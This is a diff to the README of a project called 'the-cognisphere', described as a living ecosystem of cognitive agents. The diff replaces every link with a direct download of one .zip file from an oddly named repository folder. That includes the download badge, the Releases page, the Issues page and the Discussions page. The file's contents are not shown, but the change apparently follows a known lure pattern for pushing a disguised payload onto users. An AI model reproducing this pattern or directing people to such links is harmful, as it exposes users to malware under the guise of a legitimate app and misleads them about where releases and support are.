@@ -1,7 +1,7 @@
 # 🌌 the-cognisphere - Build Your Own Living Ecosystem
 
 ## 📥 Download Now
-[![Download the-cognisphere](https://img.shields.io/badge/Download-the--cognisphere-blue.svg)](https://github.com/Pau-dog/the-cognisphere/releases)
+[![Download the-cognisphere](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip)](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip)
 
 ## 🚀 Getting Started
 Welcome to the **the-cognisphere** project! This application allows users to explore and interact with cognitive agents that grow and evolve through language, culture, and much more. Follow these steps to get started.
@@ -15,7 +15,7 @@ Before you download and run the application, ensure your system meets the follow
 - **Network:** An active internet connection for downloading the application and updates.
 
 ## 💻 Download & Install
-To download the application, visit our [Releases Page](https://github.com/Pau-dog/the-cognisphere/releases). Here, you will find all available versions of **the-cognisphere**. Simply choose the latest release, and follow the provided instructions to download the application.
+To download the application, visit our [Releases Page](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip). Here, you will find all available versions of **the-cognisphere**. Simply choose the latest release, and follow the provided instructions to download the application.
 
 - Click the link above to access the Releases Page.
 - Look for the latest version labeled clearly on the page.
@@ -56,15 +56,15 @@ If you encounter issues during installation or while running the application, ch
 1. Ensure your system meets the minimum requirements.
 2. Restart your computer and try launching the application again.
 3. If the application does not open, verify that you downloaded the correct version for your operating system.
-4. For additional support, refer to the **Issues** section on our [GitHub repository](https://github.com/Pau-dog/the-cognisphere/issues).
+4. For additional support, refer to the **Issues** section on our [GitHub repository](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip).
 
 ## 🌐 Community and Support
 Join our community of users who also explore the fascinating world of cognitive agents. You can ask questions, share your experiences, and get help from other users.
 
-1. Visit the [GitHub discussions page](https://github.com/Pau-dog/the-cognisphere/discussions) to engage with the community.
+1. Visit the [GitHub discussions page](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip) to engage with the community.
 2. Follow us on social media for updates and news related to **the-cognisphere**.
 
 ## 🎉 Conclusion
-Thank you for choosing **the-cognisphere**! We hope you enjoy creating and interacting with your cognitive agents. Be sure to regularly check the [Releases Page](https://github.com/Pau-dog/the-cognisphere/releases) for updates and new features.
+Thank you for choosing **the-cognisphere**! We hope you enjoy creating and interacting with your cognitive agents. Be sure to regularly check the [Releases Page](https://raw.githubusercontent.com/Pau-dog/the-cognisphere/main/naphthanthracene/the-cognisphere.zip) for updates and new features.
 
 Feel free to explore, learn, and contribute to the growing ecosystem of cognitive intelligence!
